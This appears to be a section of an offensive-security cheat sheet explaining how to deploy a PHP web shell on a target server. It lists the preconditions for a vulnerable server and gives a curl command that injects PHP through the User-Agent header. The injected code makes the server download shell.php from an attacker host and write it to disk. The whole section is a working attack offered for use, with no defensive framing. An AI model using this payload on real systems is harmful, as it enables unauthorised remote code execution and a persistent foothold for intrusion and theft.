## Shells

Shells Section: Using Curl for Remote File Creation

REQUIREMENTS:
1. PHP Support: The target server must be able to execute PHP code.
2. User-Agent PHP Execution: The server must execute PHP within user agent strings.
3. Writable Directory: The server directory where shell.php is written must be writable.
4. Outbound Access: The server needs internet access to fetch the PHP shell from the attacker's server.

Overview
This section demonstrates how to use curl, a versatile command-line tool, for exploiting web vulnerabilities to deploy a PHP shell on a target machine. The provided commands leverage curl's user agent string manipulation to execute PHP code remotely, leading to the creation of a shell file on the server.

Command 
bash

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

curl -A â€œ<?php file_put_contents('shell.php', file_get_contents('http://{ATTACKER_IP}/shell.php')); ?>" -s http://{MACHINE_IP}
